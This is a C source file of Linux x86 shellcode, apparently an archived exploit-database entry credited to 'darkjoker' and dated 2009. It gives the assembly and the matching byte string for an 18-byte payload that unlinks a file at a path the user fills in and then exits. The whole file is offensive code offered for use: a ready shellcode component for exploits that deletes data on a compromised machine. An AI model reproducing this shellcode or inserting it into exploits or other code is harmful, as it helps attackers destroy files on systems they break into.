/*
Author    : darkjoker
Site      : http://darkjoker.net23.net
Shellcode : linux/x86 File unlinker 18 bytes + file path length

        .global _start
_start:
        jmp     one

two:
        pop     %ebx
        movb    $0xa,%al
        int     $0x80

        movb    $0x1, %al
        xor     %ebx, %ebx
        int     $0x80

one:
        call    two
        .string "file"
*/

char main [] =
"\xeb\x0b\x5b\xb0\x0a\xcd\x80\xb0"
"\x01\x31\xdb\xcd\x80\xe8\xf0\xff"
"\xff\xff"
"file" //Here file path to delete

// milw0rm.com [2009-03-03]